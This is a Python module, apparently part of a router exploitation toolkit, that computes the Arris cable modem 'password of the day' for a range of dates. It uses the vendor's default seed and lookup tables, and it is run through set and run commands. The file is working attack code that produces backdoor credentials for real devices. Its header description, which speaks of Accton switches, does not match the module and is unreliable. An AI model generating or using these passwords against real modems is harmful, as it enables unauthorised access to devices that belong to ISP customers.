# Name:Arris password of the day generator
# File:tm602a_password_day_py
# Author:Ján Trenčanský
# License: GNU GPL v3
# Created: 29.3.2015
# Last modified: 29.3.2015
# Shodan Dork:
# Description: The Accton company builds switches, which are rebranded and sold by several manufacturers.
# Based on work of Raul Pedro Fernandes Santos and  routerpwn.com
# Project homepage: http://www.borfast.com/projects/arrispwgen


import core.Misc
import core.io
from interface.messages import print_success, print_help, print_info

import datetime
import math


class Misc(core.Misc.RextMisc):
    """
Name:Arris password of the day generator
File:tm602a_password_day_py
Author:Ján Trenčanský
License: GNU GPL v3
Created: 29.3.2015
Description: The Accton company builds switches, which are rebranded and sold by several manufacturers.
Based on work of Raul Pedro Fernandes Santos and  routerpwn.com http://www.borfast.com/projects/arrispwgen

Options:
    Name        Description

    start       Set start date in format YYYY-MM-DD
    end         Set end date in format YYYY-MM-DD
    """
    start_date = datetime.date.today().isoformat()
    end_date = datetime.date.today()
    end_date += datetime.timedelta(days=1)
    end_date = end_date.isoformat()

    def __init__(self):
        core.Misc.RextMisc.__init__(self)

    def do_set(self, e):
        args = e.split(' ')
        if args[0] == "start":
            self.start_date = args[1]  # Date format validation should be here.
        elif args[0] == "end":
            self.end_date = args[1]

    def do_start(self, e):
        print_info(self.start_date)

    def do_end(self, e):
        print_info(self.end_date)

    def help_set(self):
        print_help("Set value of variable: \"set start 2015-06-01\"")

    def help_start(self):
        print_help("Prints value of variable start_date")
        print("In this module both start and end date must be specified!")
        print("Password for date in end_date is not generated! (Not inclusive loop)")

    def help_end(self):
        print_help("Prints value of variable end_date")
        print("In this module both start and end date must be specified!")
        print("Password for date in end_date is not generated! (Not inclusive loop)")

    def do_run(self, e):
        self.generate_arris_password(self.start_date, self.end_date)

    def generate_arris_password(self, start_date_str, end_date_str):
        seed = 'MPSJKMDHAI'
        seed_eight = seed[:8]
        table1 = [[15, 15, 24, 20, 24],
                  [13, 14, 27, 32, 10],
                  [29, 14, 32, 29, 24],
                  [23, 32, 24, 29, 29],
                  [14, 29, 10, 21, 29],
                  [34, 27, 16, 23, 30],
                  [14, 22, 24, 17, 13]]
        table2 = [[0, 1, 2, 9, 3, 4, 5, 6, 7, 8],
                  [1, 4, 3, 9, 0, 7, 8, 2, 5, 6],
                  [7, 2, 8, 9, 4, 1, 6, 0, 3, 5],
                  [6, 3, 5, 9, 1, 8, 2, 7, 4, 0],
                  [4, 7, 0, 9, 5, 2, 3, 1, 8, 6],
                  [5, 6, 1, 9, 8, 0, 4, 3, 2, 7]]

        alphanum = [
            '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'A', 'B', 'C', 'D',
            'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R',
            'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'
        ]

        list1 = [0]*8
        list2 = [0]*9
        list3 = [0]*10
        list4 = [0]*10
        list5 = [0]*10

        start_date = datetime.datetime.strptime(start_date_str, "%Y-%m-%d")
        end_date = datetime.datetime.strptime(end_date_str, "%Y-%m-%d")
        for single_date in daterange(start_date, end_date):
            year = int(single_date.strftime("%y"))
            month = int(single_date.strftime("%m"))
            day_of_month = int(single_date.strftime("%d"))
            day_of_week = int(single_date.strftime("%w")) - 1
            if day_of_week < 0:
                day_of_week = 6
            for i in range(5):
                list1[i] = table1[day_of_week][i]
            list1[5] = day_of_month
            if ((year + month) - day_of_month) < 0:
                list1[6] = (((year + month) - day_of_month) + 36) % 36
            else:
                list1[6] = ((year + month) - day_of_month) % 36
            list1[7] = (((3 + ((year + month) % 12)) * day_of_month) % 37) % 36
            for i in range(8):
                list2[i] = ord(seed_eight[i]) % 36
            for i in range(8):
                list3[i] = (list1[i] + list2[i]) % 36
            list3[8] = (list3[0] + list3[1] + list3[2] + list3[3] + list3[4] + list3[5] + list3[6] + list3[7]) % 36

            num8 = list3[8] % 6
            list3[9] = math.floor(math.pow(num8, 2) + 0.5)  # Round to nearest integer
            for i in range(10):
                list4[i] = list3[table2[num8][i]]
            for i in range(10):
                list5[i] = int((ord(seed[i]) + list4[i]) % 36)

            password_list = [""]*10
            for i in range(10):
                password_list[i] = alphanum[list5[i]]
            password = "".join(password_list)
            print_success("password generated")
            print("Date: " + single_date.date().isoformat() + " Password:" + password)


def daterange(start_date, end_date):
    for n in range(int((end_date - start_date).days)):
        yield start_date + datetime.timedelta(n)

Misc()
